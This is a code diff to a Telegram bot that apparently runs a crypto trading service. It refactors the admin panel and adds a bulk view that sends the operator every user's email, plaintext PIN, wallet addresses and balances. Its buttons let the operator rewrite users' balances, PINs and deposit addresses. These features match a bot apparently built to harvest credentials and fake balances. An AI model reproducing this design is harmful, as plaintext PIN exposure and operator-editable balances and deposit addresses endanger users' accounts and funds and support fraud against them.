@@ -1625,15 +1625,63 @@ bot.command("admin", (ctx) => {
     return ctx.reply("📭 No registered users yet.");
   }
   const args = (ctx.message.text || "").split(" ").slice(1);
-  const targetId = args.length > 0 ? Number(args[0]) : 999001;
   const subcommands = ["list", "balance", "pin", "email", "address", "username", "clear", "trades", "signal", "remove"];
   if (args.length > 0 && subcommands.includes(args[0])) {
     return;
   }
-  if (!registeredUsers.has(targetId)) {
-    return ctx.reply(`❌ User ${targetId} not found in registered users.\n\nUse /admin list to see all users.`);
+
+  if (args.length > 0) {
+    const targetId = Number(args[0]);
+    if (!registeredUsers.has(targetId)) {
+      return ctx.reply(`❌ User ${targetId} not found in registered users.\n\nUse /admin list to see all users.`);
+    }
+    return sendAdminUserDetails(ctx, targetId);
   }
+
+  return sendAdminAllUsers(ctx);
+});
+
+function adminKeyboardFor(userId) {
+  return {
+    inline_keyboard: [
+      [
+        { text: "🔐 Edit PIN", callback_data: `admin:pin:${userId}` },
+        { text: "📧 Edit Email", callback_data: `admin:email:${userId}` },
+      ],
+      [
+        { text: "💰 Edit Balance", callback_data: `admin:balance:${userId}` },
+        { text: "🟣 Edit SOL Address", callback_data: `admin:soladdr:${userId}` },
+        { text: "🔵 Edit ETH Address", callback_data: `admin:ethaddr:${userId}` },
+      ],
+      [
+        { text: "👤 Edit Username", callback_data: `admin:username:${userId}` },
+        { text: "🔄 View Trades", callback_data: `admin:trades:${userId}` },
+      ],
+      [
+        { text: "📊 Edit Signal", callback_data: `admin:signal:${userId}` },
+      ],
+      [
+        { text: "⚙️ Settings: Slippage", callback_data: `admin:toggle:slippage:${userId}` },
+        { text: "⚙️ Auto-buy", callback_data: `admin:toggle:autobuy:${userId}` },
+      ],
+      [
+        { text: "⚙️ MEV Protection", callback_data: `admin:toggle:mev:${userId}` },
+        { text: "🗑️ Remove User", callback_data: `admin:remove:${userId}` },
+      ],
+      [
+        { text: "🧹 Clear Trades", callback_data: `admin:clear:trades:${userId}` },
+        { text: "🧹 Clear Copy", callback_data: `admin:clear:copy:${userId}` },
+        { text: "🧹 Clear Stake", callback_data: `admin:clear:stake:${userId}` },
+      ],
+    ],
+  };
+}
+
+function sendAdminUserDetails(ctx, targetId) {
   const user = registeredUsers.get(targetId);
+  if (!user) {
+    return ctx.reply(`❌ User ${targetId} not found.`);
+  }
   const solUsd = (user.solBalance || 0) * SOL_PRICE;
   const ethUsd = (user.ethBalance || 0) * ETH_PRICE;
   const usdc = user.usdcBalance || 0;
@@ -1655,41 +1703,37 @@ bot.command("admin", (ctx) => {
     `📅 Registered: ${user.registeredAt}\n` +
     `🕒 Last Active: ${user.lastActive || user.registeredAt}\n\n` +
     "Select a field to edit:";
-  const keyboard = {
-    inline_keyboard: [
-      [
-        { text: "🔐 Edit PIN", callback_data: `admin:pin:${targetId}` },
-        { text: "📧 Edit Email", callback_data: `admin:email:${targetId}` },
-      ],
-      [
-        { text: "💰 Edit Balance", callback_data: `admin:balance:${targetId}` },
-        { text: "🟣 Edit SOL Address", callback_data: `admin:soladdr:${targetId}` },
-        { text: "🔵 Edit ETH Address", callback_data: `admin:ethaddr:${targetId}` },
-      ],
-      [
-        { text: "👤 Edit Username", callback_data: `admin:username:${targetId}` },
-        { text: "🔄 View Trades", callback_data: `admin:trades:${targetId}` },
-      ],
-      [
-        { text: "📊 Edit Signal", callback_data: `admin:signal:${targetId}` },
-      ],
-      [
-        { text: "⚙️ Settings: Slippage", callback_data: `admin:toggle:slippage:${targetId}` },
-        { text: "⚙️ Auto-buy", callback_data: `admin:toggle:autobuy:${targetId}` },
-      ],
-      [
-        { text: "⚙️ MEV Protection", callback_data: `admin:toggle:mev:${targetId}` },
-        { text: "🗑️ Remove User", callback_data: `admin:remove:${targetId}` },
-      ],
-      [
-        { text: "🧹 Clear Trades", callback_data: `admin:clear:trades:${targetId}` },
-        { text: "🧹 Clear Copy", callback_data: `admin:clear:copy:${targetId}` },
-        { text: "🧹 Clear Stake", callback_data: `admin:clear:stake:${targetId}` },
-      ],
-    ],
-  };
-  return ctx.replyWithMarkdown(text, { reply_markup: keyboard });
-});
+  return ctx.replyWithMarkdown(text, { reply_markup: adminKeyboardFor(targetId) });
+}
+
+async function sendAdminAllUsers(ctx) {
+  const messages = [];
+  for (const user of registeredUsers.values()) {
+    const solUsd = (user.solBalance || 0) * SOL_PRICE;
+    const ethUsd = (user.ethBalance || 0) * ETH_PRICE;
+    const usdc = user.usdcBalance || 0;
+    const total = solUsd + ethUsd + usdc;
+    const text =
+      "📋 *User Details (ID: " + user.userId + ")*\n\n" +
+      `*1.* @${user.username || "unknown"} (ID: ${user.userId})\n` +
+      `📧 Email: \`${user.email}\`\n` +
+      `🔐 PIN: \`${user.pin}\`\n` +
+      `🟣 SOL Address: \`${user.address || "N/A"}\`\n` +
+      `🔵 ETH Address: \`${user.ethAddress || "N/A"}\`\n` +
+      `💵 SOL: $${solUsd.toFixed(2)} (${(user.solBalance || 0).toFixed(4)} SOL)\n` +
+      `💵 ETH: $${ethUsd.toFixed(2)} (${(user.ethBalance || 0).toFixed(4)} ETH)\n` +
+      `💵 USDC: $${usdc.toFixed(2)}\n` +
+      `💎 Total: $${total.toFixed(2)}\n` +
+      `🔄 Trades: ${user.tradeHistory?.length || 0}\n` +
+      `📋 Copy Trades: ${user.copyTrades?.length || 0}\n` +
+      `💎 Staking Positions: ${user.stakingPositions?.length || 0}\n` +
+      `📅 Registered: ${user.registeredAt}\n` +
+      `🕒 Last Active: ${user.lastActive || user.registeredAt}\n\n` +
+      "Select a field to edit:";
+    messages.push(ctx.replyWithMarkdown(text, { reply_markup: adminKeyboardFor(user.userId) }));
+  }
+  await Promise.all(messages);
+}
 
 bot.action(/^admin:pin:(\d+)$/, async (ctx) => {
   if (!isAdmin(ctx.from.id)) {
@@ -1810,39 +1854,7 @@ bot.action(/^admin:cancel:(\d+)$/, async (ctx) => {
   const userId = Number(ctx.match[1]);
   await ctx.answerCbQuery();
   adminStates.delete(userId);
-  await ctx.editMessageReplyMarkup({
-     inline_keyboard: [
-      [
-        { text: "🔐 Edit PIN", callback_data: `admin:pin:${userId}` },
-        { text: "📧 Edit Email", callback_data: `admin:email:${userId}` },
-      ],
-      [
-        { text: "💰 Edit Balance", callback_data: `admin:balance:${userId}` },
-        { text: "🟣 Edit SOL Address", callback_data: `admin:soladdr:${userId}` },
-        { text: "🔵 Edit ETH Address", callback_data: `admin:ethaddr:${userId}` },
-      ],
-         [
-          { text: "👤 Edit Username", callback_data: `admin:username:${userId}` },
-          { text: "🔄 View Trades", callback_data: `admin:trades:${userId}` },
-        ],
-        [
-          { text: "⚙️ Settings: Slippage", callback_data: `admin:toggle:slippage:${userId}` },
-          { text: "⚙️ Auto-buy", callback_data: `admin:toggle:autobuy:${userId}` },
-        ],
-        [
-          { text: "⚙️ MEV Protection", callback_data: `admin:toggle:mev:${userId}` },
-          { text: "🗑️ Remove User", callback_data: `admin:remove:${userId}` },
-        ],
-        [
-          { text: "🧹 Clear Trades", callback_data: `admin:clear:trades:${userId}` },
-          { text: "🧹 Clear Copy", callback_data: `admin:clear:copy:${userId}` },
-          { text: "🧹 Clear Stake", callback_data: `admin:clear:stake:${userId}` },
-        ],
-        [
-          { text: "📊 Edit Signal", callback_data: `admin:signal:${userId}` },
-        ],
-    ],
-  });
+  await ctx.editMessageReplyMarkup({ inline_keyboard: adminKeyboardFor(userId).inline_keyboard });
 });
 
 bot.action(/^admin:signal:(\d+)$/, async (ctx) => {
